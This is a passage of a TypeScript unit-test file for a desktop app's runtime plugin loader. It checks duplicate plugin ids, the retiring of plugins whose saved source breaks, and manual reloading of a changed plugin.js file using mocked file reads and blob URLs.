      expect($pluginRecords.get().beta).toMatchObject({ status: 'error', file: `${root}/beta/plugin.js` })
      expect($pluginRecords.get().beta?.error).toMatch(/duplicate id "dup", already loaded from .*alpha\/plugin\.js/)
    } finally {
      unloadRuntimePlugin('dup')
      delete counters.__dupAlpha
      delete counters.__dupBeta
      restore()
    }
  })

  it('a save that no longer loads retires the previous incarnation instead of leaving it live', async () => {
    const restore = withBlobReroute()
    counters.__staleHits = 0

    let source = `
      import { host } from '@hermes/plugin-sdk'
      export default {
        id: 'stale',
        register() { host.onEvent('bot_relay.outbox.pending', () => { globalThis.__staleHits++ }) }
      }
    `

    try {
      rootWith({ 'stale-folder': () => source })

      await discoverRuntimePlugins()
      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
      expect(counters.__staleHits).toBe(1)
      expect($pluginRecords.get().stale).toMatchObject({ status: 'loaded' })

      // Mid-edit save: the file on disk is now broken.
      source = 'export default {'
      await discoverRuntimePlugins()

      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
      expect(counters.__staleHits).toBe(1)
      expect($pluginRecords.get().stale).toBeUndefined()
      expect($pluginRecords.get()['stale-folder']).toMatchObject({ status: 'error' })
    } finally {
      unloadRuntimePlugin('stale')
      delete counters.__staleHits
      restore()
    }
  })
})

describe('manual "Reload desktop plugins" (#91503)', () => {
  it('re-reads an already-known plugin.js path and swaps in the new module', async () => {
    const root = '/local/.hermes/desktop-plugins'
    desktopPluginsRoot.mockResolvedValue(root)
    readDir.mockImplementation(async dir => {
      if (dir === root) {
        return { entries: [{ isDirectory: true, name: 'replaceable', path: `${root}/replaceable` }] }
      }

      if (dir === `${root}/replaceable`) {
        return { entries: [{ isDirectory: false, name: 'plugin.js', path: `${root}/replaceable/plugin.js` }] }
      }

      return { entries: [] }
    })

    const registerV1 = vi.fn()
    const registerV2 = vi.fn()
    Object.assign(globalThis, { __replaceableV1: registerV1, __replaceableV2: registerV2 })
    let source = 'export default { id: "replaceable", register: globalThis.__replaceableV1 }'
    readFileText.mockImplementation(async () => ({ text: source }))
    let watchN = 0
    watchPreviewFile.mockImplementation(async () => ({ id: `w-replaceable-${++watchN}` }))

    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    try {
      await discoverRuntimePlugins()
      expect(registerV1).toHaveBeenCalledTimes(1)

      // Atomic directory replacement: same path, same id, new bytes.
      source = 'export default { id: "replaceable", register: globalThis.__replaceableV2 }'
      await discoverRuntimePlugins()

      expect(registerV2).toHaveBeenCalledTimes(1)
      expect(registerV1).toHaveBeenCalledTimes(1)
      // The old inode's watch is released and the current file is watched again.
      expect(stopPreviewFileWatch).toHaveBeenCalledWith('w-replaceable-1')
      expect(watchPreviewFile).toHaveBeenCalledTimes(2)
    } finally {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
      unloadRuntimePlugin('replaceable')
      delete (globalThis as unknown as { __replaceableV1?: unknown }).__replaceableV1
      delete (globalThis as unknown as { __replaceableV2?: unknown }).__replaceableV2
    }
  })
})
